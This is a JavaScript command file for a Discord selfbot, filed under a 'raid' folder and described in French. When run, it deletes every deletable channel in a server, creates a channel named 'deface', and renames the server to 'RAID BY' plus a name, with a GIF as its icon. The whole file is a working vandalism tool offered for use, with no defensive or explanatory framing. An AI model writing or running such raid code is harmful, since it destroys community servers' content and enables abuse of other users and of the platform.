const { Client, Message } = require("discord.js-selfbot-v13");

module.exports = {
    name: "deface",
    description: "Supprime les salons et modifie l'icone et nom du serveur",
    permissions: "ADMINISTRATOR",
    dir: "raid",
    /**
     * @param {Client} client
     * @param {Message} message
     * @param {string[]} args
    */
    run: async (client, message, args) => {
        if (!message.guild) return message.edit("***Veuillez utiliser cette commande dans un serveur***");
        
        if (message.deletable) message.delete()

        const channel = await message.guild.channels.create('deface').catch(() => false);
        message.guild.channels.cache.filter(c => c.deletable && c.id !== channel?.id).forEach(c => c.delete().catch(() => false));
        message.guild.edit({
            name: `RAID BY ${client.db.name}`,
            icon: 'https://i.imgur.com/iIUzA15.gif'
        }).catch(() => false);
    }
};